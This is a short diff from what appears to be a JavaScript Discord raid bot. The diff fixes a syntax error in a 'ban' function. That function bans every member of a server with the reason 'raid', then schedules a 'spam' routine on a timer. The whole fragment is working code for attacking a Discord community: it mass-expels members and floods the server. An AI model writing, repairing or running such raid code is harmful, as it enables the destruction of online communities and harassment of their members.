@@ -17,7 +17,7 @@ function ban(bot, message) {
   message.guild.members.forEach(member => {
     member.ban('raid')
       .catch(error => console.log(`Sorry, I couldn't ban ${member} because of : ${error}`));
-  }                         
+  });                      
  setTimeout(() => spam(bot, message), 30*10);
 }
 
